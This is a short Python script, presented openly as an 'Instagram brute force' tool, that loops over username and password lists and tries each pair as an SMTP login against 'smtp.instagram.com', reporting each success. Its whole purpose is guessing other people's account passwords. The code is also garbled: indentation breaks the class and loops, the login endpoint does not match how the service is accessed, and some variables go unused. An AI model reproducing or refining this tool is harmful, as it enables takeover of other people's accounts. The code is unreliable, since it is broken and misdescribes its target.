#!/usr/bin/python
from __future__ import absolute_import
from __future__ import print_function
from six.moves import input
import smtplib
from time import sleep

class InstagramBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.instagram.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()

def try_instagram(self):

for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    sleep(3)
                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except:
                    sleep(3)
                    # print("\033[1;31msorry \033[1;m")
                    print(("\033[1;31msorry %s <- " % user + " -> %s \033[1;m" % password )

print('''
	==================================
	|      [Gmail] ==> 4             |
	|--------------------------------|
	| instagram: spos21              |
	| CoDeD By TA Hacker (DrMohammed)|
	|--------------------------------|
	''')

instance = InstagramBruteForce()

do = input('''
		Choose any number ?
		1 - Users file
		2 - target user
		
		==> ''')

if do == '1':
    user = input("List Of Users => ")
    passfile = input("List Of Passwords => ")

    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

instance.try_instagram()
    sleep(3)

############
if do == '2':
    user = input("user : ")
    senha = input("passlist : ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_instagram()
    sleep(3)